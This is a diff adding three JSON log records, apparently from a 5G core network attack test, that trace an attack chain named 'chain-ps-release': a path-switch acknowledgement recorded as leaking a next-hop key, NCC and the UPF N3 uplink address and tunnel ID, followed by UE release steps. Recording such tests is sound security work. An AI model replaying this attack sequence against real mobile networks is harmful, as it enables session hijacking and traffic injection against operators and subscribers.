@@ -1,0 +1,3 @@
+{"attack": "chain-ps-release", "step": "path-switch-ack", "amf_ue_ngap_id": 1, "ran_ue_id": 99, "leak": {"message": "PathSwitchRequestAcknowledge", "amf_ue_ngap_id": 1, "ran_ue_ngap_id": 99, "nh": "a1d7279d439530cc5ac94fa132625f68dc62eb71de15a3bca56c6fdb1a5ac05c", "ncc": 2, "sessions": [{"pdu_session_id": 1, "upf_n3_ip": "172.30.20.11", "upf_n3_teid": "00000002", "ack_transfer_hex": "401fac1e140b00000002", "note": "UPF N3 UL endpoint disclosed in ACK transfer"}]}}
+{"attack": "chain-ps-release", "step": "ue-release", "amf_ue_ngap_id": 1, "ran_ue_id": 99, "pdu_sessions": [1]}
+{"attack": "chain-ps-release", "step": "release-complete", "amf_ue_ngap_id": 1, "ran_ue_id": 99, "pdu_sessions": [1]}
